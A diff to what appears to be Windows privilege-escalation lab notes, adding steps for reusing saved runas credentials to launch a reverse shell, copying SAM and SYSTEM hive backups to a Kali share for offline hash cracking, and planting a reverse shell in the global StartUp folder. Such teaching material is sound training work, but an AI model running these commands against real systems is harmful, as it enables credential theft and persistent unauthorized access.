@@ -502,6 +502,9 @@ Windows can cache credentials used with `runas`. If admin credentials are saved,
 # List saved credentials
 cmdkey /list
 
+# If no saved creds exist yet, refresh them
+C:\PrivEsc\savecred.bat
+
 # Run reverse shell as admin using saved credentials
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
@@ -509,10 +512,16 @@ runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ### SAM database dump
 The SAM file stores NTLM password hashes, encrypted with a boot key in the SYSTEM file. With both files you can extract and crack hashes offline.
 
+Look for SAM and SYSTEM backup files in `C:\Windows\Repair\` or `C:\Windows\System32\config\RegBack\`.
+
 ```cmd
 # Transfer SAM and SYSTEM files to Kali
 copy C:\Windows\Repair\SAM \\<KALI_IP>\kali\
 copy C:\Windows\Repair\SYSTEM \\<KALI_IP>\kali\
+
+# Also check RegBack
+copy C:\Windows\System32\config\RegBack\SAM \\<KALI_IP>\kali\
+copy C:\Windows\System32\config\RegBack\SYSTEM \\<KALI_IP>\kali\
 ```
 ```bash
 # Dump hashes (use Tib3rius creddump7 — Kali default is outdated for Win 10)
@@ -573,10 +582,16 @@ Files in the global StartUp folder execute for every user at logon. Plant a reve
 # Check write access
 accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
 
-# Copy reverse shell or create shortcut
+# Copy reverse shell or create a shortcut
 copy C:\PrivEsc\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.exe"
+
+# Alternatively create a shortcut using the lab VBS helper
+cscript C:\PrivEsc\CreateShortcut.vbs
 ```
-Trigger by opening a new RDP session as admin.
+Trigger by opening a new RDP session as admin:
+```bash
+rdesktop -u admin <TARGET_IP>
+```
 
 ---
 
